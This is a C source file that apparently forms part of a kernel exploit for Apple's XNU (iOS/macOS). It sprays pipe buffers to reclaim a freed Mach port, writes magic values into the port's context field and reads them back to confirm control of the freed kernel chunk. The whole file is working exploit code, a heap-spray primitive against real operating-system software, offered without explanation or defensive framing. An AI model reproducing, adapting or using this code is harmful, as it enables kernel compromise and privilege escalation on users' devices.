#include "pipes.h"

void prepare_pipes(int **pipe_fds) {
    int i;
    int pipe_fds_tmp[2];

    *pipe_fds = calloc(2 * N_PIPES, sizeof(int));
    for (i = 0; i < N_PIPES; i++) {
        pipe(pipe_fds_tmp);
        (*pipe_fds)[2*i] = pipe_fds_tmp[0];
        (*pipe_fds)[2*i+1] = pipe_fds_tmp[1];
    }
}


int control_port_via_pipe(int *pipe_fds, uint64_t offset, mach_port_t *port_to_destroy,
			  mach_port_t target_port, int *pipe_number) {
    int i, ret;
    uint8_t *data;
    uint32_t *ip_context;
    uint32_t *lck_something;
    mach_port_context_t context;

    data = calloc(KALLOC_4096, sizeof(uint8_t));
    ip_context = (uint32_t *)(data + offset + IP_CONTEXT_PORT_OFFSET);
    lck_something = (uint32_t *)(data + offset + IO_LOCK_TYPE_PORT_OFFSET);
    *lck_something = 17;
    ret = 0;

    mach_port_destroy(mach_task_self(), *port_to_destroy);

    for (i = 0; i < N_PIPES; i++) {
        *ip_context = MAGIC_CONSTANT + i;
	    write(pipe_fds[2*i+1], data, KALLOC_4096);
    }

    mach_port_get_context(mach_task_self(), target_port, &context);
    printf("Context: %x\n", context);
    if (context - MAGIC_CONSTANT >= N_PIPES) {
        printf("Context To Big. Spray Not Successful.\n");
        ret = 1;
    } else {
        *pipe_number = context - MAGIC_CONSTANT;
        printf("Pipe Number: %d\n", *pipe_number);
        printf("Now Controlling Target Chunk Via Pipes\n");
    }

    free(data);
    return ret;
}